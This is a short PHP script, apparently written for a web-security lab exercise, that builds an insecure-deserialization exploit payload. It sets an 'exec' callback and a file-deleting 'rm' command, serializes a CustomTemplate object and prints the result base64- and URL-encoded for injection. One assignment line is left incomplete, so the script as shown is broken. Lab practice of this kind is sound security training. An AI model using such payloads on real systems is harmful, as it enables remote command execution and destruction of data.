<?php
require_once 'CustomTemplate.php';
// function sayHello 
$callback = 'exec';
$command = "rm /home/carlos/morale.txt";
$CustomTemplate = new CustomTemplate();
$CustomTemplate->desc 

$ser = serialize($CustomTemplate);
echo($ser . "\n");
echo("===================================================\n");
echo("base64 endcoded then urlencoded: \n");
echo(urlencode(base64_encode($ser)) . "\n");
// echo $default_map->$sayHello_2 . "\n"; 
?>

